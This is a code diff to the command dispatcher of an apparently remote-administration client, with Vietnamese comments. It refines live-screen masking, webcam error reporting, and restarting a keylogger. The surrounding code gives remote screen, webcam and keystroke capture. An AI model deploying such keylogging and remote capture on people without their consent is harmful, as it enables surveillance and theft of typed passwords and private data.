@@ -229,9 +229,17 @@ class CommandDispatcher(QObject):
         # Admin rời trang đột ngột) vẫn chưa tắt, LiveScreenStreamer.start_stream
         # sẽ tự động dừng stream cũ rồi khởi động lại -> lệnh start luôn thành công.
         fps = self._clamp_fps(payload.get("fps"), settings.SCREEN_FPS)
-        # Admin đang xem CHÍNH máy này (Web App tự phát hiện và gửi kèm) → yêu cầu
-        # che toàn bộ cửa sổ trình duyệt để chống đệ quy feedback loop.
+        # Admin đang xem CHÍNH máy này (Web App tự phát hiện và gửi kèm) → che
+        # vùng khung xem Live Screen để chống đệ quy feedback loop. Nếu Web App
+        # gửi kèm `video_rect` (toạ độ khung xem, CSS px, tương đối cửa sổ trình
+        # duyệt) + `dpr` thì Client chỉ che ĐÚNG vùng đó — không còn đen màn hình
+        # toàn bộ khi cửa sổ trình duyệt được phóng to.
         self_view = bool(payload.get("self_view", False))
+        video_rect = payload.get("video_rect") if self_view else None
+        try:
+            dpr = float(payload.get("dpr", 1.0) or 1.0)
+        except (TypeError, ValueError):
+            dpr = 1.0
         frame_counter = {"n": 0}
 
         def on_frame(base64_img: str, width: int, height: int) -> None:
@@ -250,7 +258,13 @@ class CommandDispatcher(QObject):
         # start_stream/stop_stream giờ là hàm đồng bộ chạy trên worker thread,
         # KHÔNG cần lên lịch coroutine trên event loop (event loop luôn rảnh để
         # nhận lệnh điều khiển tiếp theo ngay lập tức).
-        screen_streamer.start_stream(on_frame, fps=fps, mask_browser_windows=self_view)
+        screen_streamer.start_stream(
+            on_frame,
+            fps=fps,
+            mask_browser_windows=self_view,
+            video_rect=video_rect,
+            dpr=dpr,
+        )
         self.main_window.append_log(f"📹 Bắt đầu Live Screen (FPS: {fps}).")
         self._send_response(original, {})
 
@@ -286,14 +300,14 @@ class CommandDispatcher(QObject):
             )
 
         async def _start():
-            ok = await webcam_streamer.start_webcam(on_frame, fps=fps)
+            ok, error_msg = await webcam_streamer.start_webcam(on_frame, fps=fps)
             if ok:
                 if settings.RED_INDICATOR_ENABLED:
                     self.red_indicator_signal.emit(True)
                 self.main_window.append_log(f"📷 Bắt đầu Webcam (FPS: {fps}).")
                 self._send_response(original, {})
             else:
-                self._send_error(original, "WEBCAM_NOT_FOUND", "Không thể truy cập webcam trên máy.")
+                self._send_error(original, "WEBCAM_NOT_FOUND", error_msg or "Không thể truy cập webcam trên máy.")
 
         self.gateway_service.run_coroutine_threadsafe(_start())
 
@@ -314,9 +328,9 @@ class CommandDispatcher(QObject):
     # KEYLOGGER (nhạy cảm)
     # =========================================================================
     def _handle_keylogger_start(self, payload: Dict[str, Any], original: Dict[str, Any]) -> None:
-        if keylogger_service.is_logging:
-            self._send_error(original, "ALREADY_RUNNING", "Keylogger đang chạy rồi.")
-            return
+        # Idempotent: start_logging() tự động dừng phiên cũ (nếu đang chạy do
+        # phiên trước bị sót) rồi khởi động lại -> lệnh start LUÔN thành công,
+        # không còn báo lỗi ALREADY_RUNNING (giống Live Screen).
 
         def on_flush(entries, window_title: str) -> None:
             # Chạy trên Thread nền riêng của KeyloggerService (không phải GUI Thread
